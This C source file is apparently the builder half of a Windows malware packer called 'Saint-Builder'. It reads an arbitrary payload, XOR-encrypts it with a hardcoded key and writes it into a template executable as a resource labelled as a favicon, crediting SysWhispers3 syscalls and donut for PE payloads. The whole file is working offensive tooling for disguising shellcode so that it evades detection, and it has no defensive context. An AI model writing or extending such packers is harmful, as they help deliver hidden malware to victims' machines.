#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#include "resource.h"

void xor(char* content, size_t content_size, char* key, int key_size)
{
	for (int i = 0; i < content_size; i++)
	{
		content[i] = content[i] ^ key[i % key_size];
	}
}

void banner()
{
	printf(" _____       _       _         ______       _ _     _           \n");
	printf("/  ___|     (_)     | |        | ___ \\     (_) |   | |          \n");
	printf("\\ `--.  __ _ _ _ __ | |_ ______| |_/ /_   _ _| | __| | ___ _ __ \n");
	printf(" `--. \\/ _` | | '_ \\| __|______| ___ \\ | | | | |/ _` |/ _ \\ '__|\n");
	printf("/\\__/ / (_| | | | | | |_       | |_/ / |_| | | | (_| |  __/ |    \n");
	printf("\\____/ \\__,_|_|_| |_|\\__|      \\____/ \\__,_|_|_|\\__,_|\\___|_|   \n");
	printf("Basic builder with syscalls (thanks SysWhispers3) to pack raw files (for PE you need to use donut)\nv1.0 by Dallas\n\n");
}


#define FAVICON_ICO 101

unsigned char key[] = { 0x05, 0x10, 0x45, 0x89, 0x64, 0x32, 0x115, 0x210, 0x175, 0x112, 0x176 };

int main()
{
	banner();
	char _PayloadPath[512];
	char _PayloadOutput[512];
	SIZE_T _PayloadSize;

	printf("Payload path : ");
	scanf_s("%s", _PayloadPath);
	printf("Output path : ");
	scanf_s("%s", _PayloadOutput);

	HANDLE hPayload = CreateFileA(_PayloadPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hPayload == INVALID_HANDLE_VALUE)
	{
		printf("[!] No payload found...\n");
		return 0;
	}

	GetFileSizeEx(hPayload, &_PayloadSize);
	printf("[!] Payload size : %d\n", _PayloadSize);

	unsigned char* _PayloadContent = malloc(sizeof(char) * _PayloadSize);
	ReadFile(hPayload, _PayloadContent, _PayloadSize, NULL, NULL);
	CloseHandle(hPayload);

	LPVOID _AddrEncryptedBuff = VirtualAlloc(NULL, _PayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	RtlMoveMemory(_AddrEncryptedBuff, _PayloadContent, _PayloadSize);
	xor ((char*)_AddrEncryptedBuff, _PayloadSize, key, sizeof(key));
	unsigned char* _EncryptedPayload = malloc(sizeof(char) * _PayloadSize);
	ReadProcessMemory(GetCurrentProcess(), _AddrEncryptedBuff, _EncryptedPayload, _PayloadSize, NULL);

	HRSRC myRes = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
	HGLOBAL resHandle = LoadResource(NULL, myRes);
	unsigned char *_TemplatePayload = (char*)LockResource(resHandle);
	unsigned long int _TemplateSize = SizeofResource(NULL, myRes);

	HANDLE _hDropPayload = CreateFileA(_PayloadOutput, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (_hDropPayload == INVALID_HANDLE_VALUE)
	{
		printf("Impossible to drop template\nHo zebi ta dus faire un truck chelou\n");
		return 0;
	}
	WriteFile(_hDropPayload, _TemplatePayload, _TemplateSize, NULL, NULL);
	CloseHandle(_hDropPayload);
	printf("[!]Template was drop, now edit the ressource of PE to add your payload\n");

	HANDLE hUpdateRes = BeginUpdateResourceA(_PayloadOutput, FALSE);
	if (hUpdateRes == NULL)
	{
		printf("Error on BeginUpdateResourceA : %d\n", GetLastError());
		return 0;
	}

	if (!UpdateResourceA(hUpdateRes, RT_RCDATA, MAKEINTRESOURCE(FAVICON_ICO), 1036, _EncryptedPayload, _PayloadSize))
	{
		printf("Impossible to update ressource : %d\n", GetLastError());
		return 0;
	}

	if (!EndUpdateResource(hUpdateRes, FALSE))
	{
		printf("Impossible to write ressource : %d\n", GetLastError());
		return 0;
	}

	printf("[+]Your payload was ready !\n");
	
}